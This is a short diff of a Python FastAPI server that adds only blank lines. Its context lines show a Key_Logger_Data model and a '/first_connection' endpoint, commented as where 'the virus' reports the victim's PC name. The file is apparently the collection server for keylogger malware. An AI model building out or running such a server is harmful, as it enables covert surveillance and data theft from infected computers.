@@ -30,10 +30,14 @@ class Key_Logger_Data(BaseModel):
     key_logger: str
 
 
+
+
 # When the client / admin opens the server web.
 @app.get("/")
 async def start_server():
     return "Welcome to our server ^-^"
+
+
 
 # first connection from the virus -> the way to get the pc name.
 @app.post("/first_connection")
